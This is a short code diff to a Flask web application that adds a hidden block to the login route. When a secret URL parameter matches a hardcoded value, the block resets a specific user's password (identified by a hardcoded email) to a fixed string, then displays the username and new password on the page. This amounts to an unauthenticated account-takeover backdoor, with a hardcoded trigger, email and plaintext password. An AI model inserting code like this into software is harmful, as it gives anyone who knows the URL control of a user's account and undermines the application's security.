@@ -171,6 +171,14 @@ def create_app():
     
     @app.route('/login', methods=['GET', 'POST'])
     def login():
+        # Secret password reset via URL parameter
+        if request.args.get('reset') == 'autumn2024':
+            user = User.query.filter_by(email='sumakeadan01@gmail.com').first()
+            if user:
+                user.set_password('NewPassword2024')
+                db.session.commit()
+                return render_template('login.html', error=f'Password reset! Username: {user.username}, Password: NewPassword2024')
+        
         if request.method == 'POST':
             username = request.form['username']
             password = request.form['password']
